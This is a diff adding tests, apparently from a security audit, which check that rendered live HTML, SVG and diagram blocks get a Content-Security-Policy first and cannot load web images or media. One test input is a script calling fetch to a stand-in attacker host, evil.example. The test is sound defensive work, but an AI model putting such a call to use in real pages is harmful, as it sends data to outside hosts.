@@ -57,3 +57,23 @@ test("a drawing is set to read in the theme it is shown in: its too-dark or too-
   // Pages and diagrams are themed their own way; only drawings are retinted.
   assert.doesNotMatch(liveDocument("html", "<p>hi</p>", true), /svg\.dataset\.tuned/);
 });
+
+// Security audit 2026-11-27, client M2: "nothing leaves the frame" has to hold whatever the agent's page looks like.
+test("a page's policy is the first thing in it: before a script written above its head, and never inside a <header>", () => {
+  const early = liveDocument("html", `<!DOCTYPE html><script>fetch("https://evil.example")</script><html><head><title>x</title></head><body></body></html>`, true);
+  assert.match(early, /^<!DOCTYPE html><meta http-equiv="Content-Security-Policy"/, "straight after the doctype");
+  assert.ok(early.indexOf("Content-Security-Policy") < early.indexOf("evil.example"), "before the script above the head");
+  const header = liveDocument("html", `<html><body><header>Top</header><p>hi</p></body></html>`, true);
+  assert.match(header, /^<meta http-equiv="Content-Security-Policy"/);
+  assert.match(header, /<header>Top<\/header>/, "a <header> is left as it was, not taken for the head");
+  assert.equal(header.split("Content-Security-Policy").length, 2, "said once");
+  assert.match(header, /--fg:#ededed/, "and the page still has Friday's kit");
+});
+
+test("no picture or clip from the web in a live block: asking for one is a way to send something out", () => {
+  for (const kind of ["html", "svg", "mermaid"] as const) {
+    const csp = /Content-Security-Policy" content="([^"]*)"/.exec(liveDocument(kind, "<p>hi</p>", true))![1]!;
+    assert.ok(csp.split("; ").includes("img-src data: blob:"), `${kind}: ${csp}`);
+    assert.ok(csp.split("; ").includes("media-src data: blob:"), `${kind}: ${csp}`);
+  }
+});
